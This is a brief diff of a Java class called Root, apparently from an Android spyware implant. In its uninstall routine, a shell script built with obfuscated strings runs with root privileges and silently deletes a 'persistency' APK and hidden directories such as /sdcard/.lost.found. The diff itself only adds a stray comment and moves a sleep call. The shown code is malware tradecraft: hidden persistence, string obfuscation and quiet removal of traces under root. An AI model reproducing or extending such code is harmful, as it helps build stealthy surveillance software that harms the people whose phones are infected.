@@ -332,6 +332,7 @@ public class Root {
 				 * 4) add at the end of the scrip /data/app/<apkPath>.apk removal
 				 */
 
+			// the
 			script += String.format(M.e(" [ -e %s ] && rm %s 2>/dev/null"), Status.persistencyApk, Status.persistencyApk) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found"), M.e("/sdcard/.lost.found")) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s 2>/dev/null"), M.e("/sdcard/1"), M.e("/sdcard/1")) + "\n";
@@ -358,10 +359,10 @@ public class Root {
 
 			boolean ret = Execute.executeRootAndForgetScript(script);
 			if(!ret){
-				Utils.sleep(1000);
 				Execute.executeScript(script);
 			}
 
+			Utils.sleep(5000);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
